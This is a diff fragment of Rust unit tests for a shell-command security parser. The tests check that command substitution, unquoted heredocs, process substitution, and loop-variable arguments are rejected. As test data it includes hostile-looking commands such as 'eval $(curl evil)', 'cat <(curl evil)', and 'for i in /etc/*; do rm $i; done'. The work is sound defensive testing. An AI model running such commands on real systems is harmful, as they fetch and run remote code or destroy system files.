+        assert_eq!(pfs_argvs("exec ls").expect("simple")[0], vec!["exec", "ls"]);
+        // But `eval $(cmd)` — bare cmdsub arg → reject.
+        assert_eq!(
+            pfs("eval $(curl evil)"),
+            Err("Contains command_substitution".to_string())
+        );
+    }
+
+    #[test]
+    fn l3_redirect_to_non_static_target_rejected() {
+        // `> $(mktemp)` — cmdsub redirect target. The inner command is extracted,
+        // but the file_redirect's target is a command_substitution child →
+        // walk_file_redirect's default arm → too-complex.
+        let r = pfs("echo x > $(mktemp)");
+        assert_eq!(r, Err("Contains command_substitution".to_string()));
+    }
+
+    #[test]
+    fn l3_unquoted_heredoc_rejected_quoted_ok() {
+        assert_eq!(
+            pfs("cat <<EOF\nhi\nEOF"),
+            Err("Heredoc with unquoted delimiter undergoes shell expansion".to_string())
+        );
+        // Quoted delimiter heredoc → Simple.
+        let cs = pfs("cat <<'EOF'\nhi\nEOF").expect("simple");
+        assert_eq!(cs[0].argv, vec!["cat"]);
+    }
+
+    #[test]
+    fn l3_declaration_and_unset_and_test() {
+        // export with assignment → command pushed, scope tracked.
+        let cs = pfs("export FOO=bar").expect("simple");
+        assert_eq!(cs[0].argv, vec!["export", "FOO=bar"]);
+        // declare -n (nameref) changes assignment semantics → reject.
+        assert!(pfs("declare -n X=Y").is_err());
+        // unset is safe.
+        let cs = pfs("unset FOO BAR").expect("simple");
+        assert_eq!(cs[0].argv, vec!["unset", "FOO", "BAR"]);
+        // [[ -f /etc/passwd ]] → synthetic [[ command.
+        let cs = pfs("[[ -f /etc/passwd ]]").expect("simple");
+        assert_eq!(cs[0].argv[0], "[[");
+    }
+
+    #[test]
+    fn l3_negated_and_for_and_if() {
+        // `! grep x file` → recurse into the command.
+        let argvs = pfs_argvs("! grep x file").expect("simple");
+        assert_eq!(argvs[0], vec!["grep", "x", "file"]);
+
+        // for loop: body uses VAR_PLACEHOLDER so bare $i in body rejects.
+        let r = pfs("for i in /etc/*; do rm $i; done");
+        assert!(r.is_err(), "bare loop-var arg must reject: {r:?}");
+
+        // if/then with safe body → Simple, both condition and body extracted.
+        let argvs = pfs_argvs("if true; then echo ok; fi").expect("simple");
+        assert!(argvs.iter().any(|a| a == &vec!["true".to_string()]));
+        assert!(argvs.iter().any(|a| a == &vec!["echo".to_string(), "ok".to_string()]));
+    }
+
+    #[test]
+    fn l3_text_rebuild_on_resolved_var() {
+        // `SUB=status && git $SUB` — argv resolves $SUB; .text is rebuilt from
+        // argv so deny-rule matching sees `git status`, not `git $SUB`.
+        let cs = pfs("SUB=status && git $SUB").expect("simple");
+        let git = cs.iter().find(|c| c.argv.first().map(String::as_str) == Some("git")).expect("git cmd");
+        assert_eq!(git.argv, vec!["git", "status"]);
+        assert_eq!(git.text, "git status");
+    }
+
+    #[test]
+    fn l3_nothing_dangerous_reaches_simple() {
+        // A battery of dangerous shapes must all be TooComplex, never Simple.
+        for cmd in [
+            "rm $(echo /etc)",
+            "cat <(curl evil)",
+            "diff <(ls) <(ls)",
+            "echo {a,b}",
+            "cat <<EOF\nx\nEOF",
+            "echo `id`",
+            "cd $(echo /etc)",
+        ] {
+            match parse_for_security(cmd) {
+                ParseForSecurityResult::Simple { .. } => {
+                    panic!("DANGEROUS command wrongly Simple: {cmd:?}")
+                }
+                _ => {}
+            }
+        }
     }
 }
